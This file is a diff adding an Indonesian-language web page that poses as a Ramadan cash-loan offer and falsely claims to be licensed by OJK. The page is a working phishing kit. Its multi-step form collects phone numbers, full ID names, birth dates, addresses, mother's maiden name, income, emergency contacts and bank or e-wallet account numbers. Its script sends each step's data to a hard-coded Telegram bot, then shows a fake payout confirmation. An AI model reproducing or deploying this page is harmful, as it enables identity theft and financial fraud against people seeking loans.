@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tunai ABC Berkah Ramadhan</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f4f8;
+            padding: 10px;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background-color: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .banner {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .banner h1 {
+            color: #2c3e50;
+            font-size: 22px;
+            margin-bottom: 5px;
+        }
+
+        .banner p {
+            color: #7f8c8d;
+            font-size: 16px;
+        }
+
+        .ojk {
+            color: #27ae60 !important;
+            font-weight: bold;
+        }
+
+        .form-step {
+            display: none;
+        }
+
+        .form-step.active {
+            display: block;
+        }
+
+        .form-label {
+            display: block;
+            margin-top: 15px;
+            margin-bottom: 5px;
+            color: #2c3e50;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #bdc3c7;
+            border-radius: 5px;
+            font-size: 16px;
+            background-color: #f8f9fa;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #3498db;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background-color: #2980b9;
+        }
+
+        .verify-title {
+            text-align: center;
+            color: #27ae60;
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+
+        .verify-subtitle {
+            text-align: center;
+            color: #7f8c8d;
+            margin-bottom: 20px;
+        }
+
+        .limit-slider {
+            width: 100%;
+            margin: 15px 0;
+        }
+
+        .limit-show {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            color: #2c3e50;
+            margin-bottom: 15px;
+        }
+
+        .success-box {
+            text-align: center;
+            padding: 30px 10px;
+        }
+
+        .success-box h2 {
+            color: #27ae60;
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+
+        .success-box p {
+            color: #7f8c8d;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- BANNER -->
+        <div class="banner">
+            <h1>TUNAI ABC BERKAH RAMADHAN</h1>
+            <p>Pinjaman Mudah • Cair Cepat</p>
+            <p class="ojk">BERIZIN & DIAWASI OJK</p>
+        </div>
+
+        <!-- STEP 1: PENDAFTARAN AWAL -->
+        <div class="form-step active" id="step1">
+            <label class="form-label">Nomor HP Anda</label>
+            <input type="tel" class="form-input" id="hp" placeholder="Contoh: 081234567890">
+
+            <label class="form-label">Nama Pengguna (Nick KTP)</label>
+            <input type="text" class="form-input" id="nick-ktp" placeholder="Contoh: agus_ktp123">
+
+            <label class="form-label">Nama Lengkap Sesuai KTP</label>
+            <input type="text" class="form-input" id="nama-ktp" placeholder="Contoh: AGUS SANTOSO">
+
+            <button class="btn" onclick="gantiStep(2)">Lanjut ke Data Diri</button>
+        </div>
+
+        <!-- STEP 2: DATA DIRI -->
+        <div class="form-step" id="step2">
+            <label class="form-label">Tanggal Lahir</label>
+            <input type="date" class="form-input" id="tgl-lahir">
+
+            <label class="form-label">Kecamatan</label>
+            <input type="text" class="form-input" id="kecamatan" placeholder="Contoh: Kedaton">
+
+            <label class="form-label">Desa/Kelurahan</label>
+            <input type="text" class="form-input" id="desa" placeholder="Contoh: Sukarame">
+
+            <label class="form-label">Kode POS</label>
+            <input type="text" class="form-input" id="kodepos" placeholder="Contoh: 30123">
+
+            <label class="form-label">Nama Ibu Kandung</label>
+            <input type="text" class="form-input" id="ibu-kandung" placeholder="Contoh: SITI MARIA">
+
+            <button class="btn" onclick="gantiStep(3)">Lanjut ke Data Pekerjaan</button>
+        </div>
+
+        <!-- STEP 3: DATA PEKERJAAN -->
+        <div class="form-step" id="step3">
+            <label class="form-label">Pekerjaan Anda</label>
+            <input type="text" class="form-input" id="pekerjaan" placeholder="Contoh: Pegawai Swasta">
+
+            <label class="form-label">Pendapatan per Bulan</label>
+            <input type="text" class="form-input" id="pendapatan" placeholder="Contoh: 8.000.000">
+
+            <label class="form-label">Total Hutang Saat Ini</label>
+            <input type="text" class="form-input" id="hutang" placeholder="Contoh: 2.000.000">
+
+            <label class="form-label">Keperluan Pinjaman</label>
+            <input type="text" class="form-input" id="keperluan" placeholder="Contoh: Modal Usaha">
+
+            <button class="btn" onclick="gantiStep(4)">Lanjut ke Kontak Darurat</button>
+        </div>
+
+        <!-- STEP 4: KONTAK DARURAT -->
+        <div class="form-step" id="step4">
+            <label class="form-label">Nama Kontak Darurat 1</label>
+            <input type="text" class="form-input" id="kontak1" placeholder="Contoh: BUDI">
+
+            <label class="form-label">Hubungan</label>
+            <input type="text" class="form-input" id="hub1" placeholder="Contoh: Saudara">
+
+            <label class="form-label">Nomor HP Kontak 1</label>
+            <input type="tel" class="form-input" id="hp-kontak1" placeholder="Contoh: 08123456789">
+
+            <label class="form-label">Nama Kontak Darurat 2</label>
+            <input type="text" class="form-input" id="kontak2" placeholder="Contoh: SITI">
+
+            <label class="form-label">Hubungan</label>
+            <input type="text" class="form-input" id="hub2" placeholder="Contoh: Istri">
+
+            <label class="form-label">Nomor HP Kontak 2</label>
+            <input type="tel" class="form-input" id="hp-kontak2" placeholder="Contoh: 08987654321">
+
+            <button class="btn" onclick="gantiStep(5)">Lanjut ke Verifikasi Limit</button>
+        </div>
+
+        <!-- STEP 5: VERIFIKASI LIMIT -->
+        <div class="form-step" id="step5">
+            <h2 class="verify-title">✅ VERIFIKASI BERHASIL!</h2>
+            <p class="verify-subtitle">Limit Pinjaman Anda Sudah Ditentukan</p>
+
+            <label class="form-label">Limit Pinjaman</label>
+            <input type="range" min="10000000" max="250000000" step="1000000" class="limit-slider" id="slider" oninput="updateLimit(this.value)">
+            <div class="limit-show" id="limit-show">Rp10.914.474</div>
+
+            <label class="form-label">Pilih Jumlah Pinjaman</label>
+            <select class="form-input" id="jumlah-pinjam">
+                <option value="10000000">Rp10.000.000</option>
+                <option value="25000000">Rp25.000.000</option>
+                <option value="50000000">Rp50.000.000</option>
+                <option value="100000000">Rp100.000.000</option>
+                <option value="150000000">Rp150.000.000</option>
+                <option value="250000000">Rp250.000.000</option>
+            </select>
+
+            <label class="form-label">Tenor Pinjaman</label>
+            <select class="form-input" id="tenor">
+                <option value="1">1 Bulan</option>
+                <option value="3">3 Bulan</option>
+                <option value="6">6 Bulan</option>
+            </select>
+
+            <button class="btn" onclick="gantiStep(6)">Lanjut ke Pencairan</button>
+        </div>
+
+        <!-- STEP 6: PENCAIRAN DANA -->
+        <div class="form-step" id="step6">
+            <label class="form-label">Pilih Metode Pencairan</label>
+            <select class="form-input" id="metode-cair">
+                <option value="bank">Transfer Bank</option>
+                <option value="ewallet">E-Wallet</option>
+            </select>
+
+            <label class="form-label">Nama Penerima</label>
+            <input type="text" class="form-input" id="nama-penerima" placeholder="Sesuai Rekening/E-Wallet">
+
+            <label class="form-label">Nama Bank/E-Wallet</label>
+            <input type="text" class="form-input" id="nama-bank" placeholder="Contoh: BCA / OVO">
+
+            <label class="form-label">Nomor Rekening/E-Wallet</label>
+            <input type="text" class="form-input" id="no-rekening" placeholder="Contoh: 1234567890">
+
+            <button class="btn" onclick="gantiStep(7)">Konfirmasi & Kirim</button>
+        </div>
+
+        <!-- STEP 7: PENCAIRAN BERHASIL -->
+        <div class="form-step" id="step7">
+            <div class="success-box">
+                <h2>🎉 PENCAIRAN BERHASIL!</h2>
+                <p>Dana akan masuk dalam waktu 1-30 menit</p>
+                <p>Nomor Tiket: <span id="tiket">TUNAIABC-20260218-001</span></p>
+                <p style="font-weight: bold; color: #27ae60; margin-top: 15px;">CS: 0858-9881-886</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // KONFIGURASI BOT TELEGRAM
+        const BOT_TOKEN = "8067130100:AAE5FOOfKpiNGbydAIAczleTkO_UJoukEMU";
+        const CHAT_ID = "8571321926";
+
+        // FUNGSI UPDATE LIMIT
+        function updateLimit(val) {
+            const format = new Intl.NumberFormat('id-ID', {
+                style: 'currency',
+                currency: 'IDR',
+                maximumFractionDigits: 0
+            }).format(val);
+            document.getElementById('limit-show').innerText = format;
+        }
+
+        // FUNGSI GANTI STEP
+        function gantiStep(stepTujuan) {
+            // Sembunyikan semua step
+            document.querySelectorAll('.form-step').forEach(step => {
+                step.classList.remove('active');
+            });
+            // Tampilkan step yang dipilih
+            document.getElementById('step' + stepTujuan).classList.add('active');
+            // Kirim data ke Telegram
+            kirimData(stepTujuan);
+        }
+
+        // FUNGSI KIRIM DATA KE TELEGRAM
+        function kirimData(step) {
+            let data = "";
+            switch(step) {
+                case 2:
+                    data = `📝 DATA AWAL\nHP: ${document.getElementById('hp').value}\nNick KTP: ${document.getElementById('nick-ktp').value}\nNama Lengkap: ${document.getElementById('nama-ktp').value}`;
+                    break;
+                case 3:
+                    data = `👤 DATA DIRI\nTanggal Lahir: ${document.getElementById('tgl-lahir').value}\nKecamatan: ${document.getElementById('kecamatan').value}\nDesa: ${document.getElementById('desa').value}\nKode POS: ${document.getElementById('kodepos').value}\nNama Ibu Kandung: ${document.getElementById('ibu-kandung').value}`;
+                    break;
+                case 4:
+                    data = `💼 DATA PEKERJAAN\nPekerjaan: ${document.getElementById('pekerjaan').value}\nPendapatan: ${document.getElementById('pendapatan').value}\nTotal Hutang: ${document.getElementById('hutang').value}\nKeperluan: ${document.getElementById('keperluan').value}`;
+                    break;
+                case 5:
+                    data = `📞 KONTAK DARURAT\nKontak 1: ${document.getElementById('kontak1').value} (${document.getElementById('hub1').value}) - ${document.getElementById('hp-kontak1').value}\nKontak 2: ${document.getElementById('kontak2').value} (${document.getElementById('hub2').value}) - ${document.getElementById('hp-kontak2').value}`;
+                    break;
+                case 6:
+                    data = `💸 DATA PINJAMAN\nLimit: ${document.getElementById('limit-show').innerText}\nJumlah Pinjaman: ${document.getElementById('jumlah-pinjam').value}\nTenor: ${document.getElementById('tenor').value} Bulan`;
+                    break;
+                case 7:
+                    data = `✅ DATA PENCAIRAN\nMetode: ${document.getElementById('metode-cair').value}\nNama Penerima: ${document.getElementById('nama-penerima').value}\nBank/E-Wallet: ${document.getElementById('nama-bank').value}\nNomor: ${document.getElementById('no-rekening').value}\nTiket: TUNAIABC-20260218-001`;
+                    break;
+            }
+
+            if (data !== "") {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: data
+                    })
+                });
+            }
+        }
+
+        // INISIALISASI
+        window.onload = () => updateLimit(10914474);
+              </script>
+              
